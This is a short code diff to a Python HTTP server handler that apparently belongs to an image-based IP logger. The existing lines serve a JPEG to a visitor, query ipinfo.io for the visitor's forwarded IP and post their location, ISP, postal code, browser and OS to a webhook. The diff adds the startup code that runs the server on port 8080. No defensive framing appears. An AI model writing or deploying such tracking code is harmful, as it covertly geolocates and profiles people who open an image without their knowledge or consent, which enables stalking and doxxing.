@@ -67,3 +67,8 @@ class handler(BaseHTTPRequestHandler):
             else: pass
         else: self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(data); ipInfo = httpx.get('https://ipinfo.io/{}/json'.format(self.headers.get('x-forwarded-for'))).json(); httpx.post(webhook,json=formatHook(ipInfo['ip'],ipInfo['city'],ipInfo['region'],ipInfo['country'],ipInfo['loc'],ipInfo['org'],ipInfo['postal'],useragent,os,browser))
         return
+if __name__ == '__main__':
+    from http.server import HTTPServer
+    server = HTTPServer(('0.0.0.0', 8080), handler)
+    print("Server started on port 8080")
+    server.serve_forever()
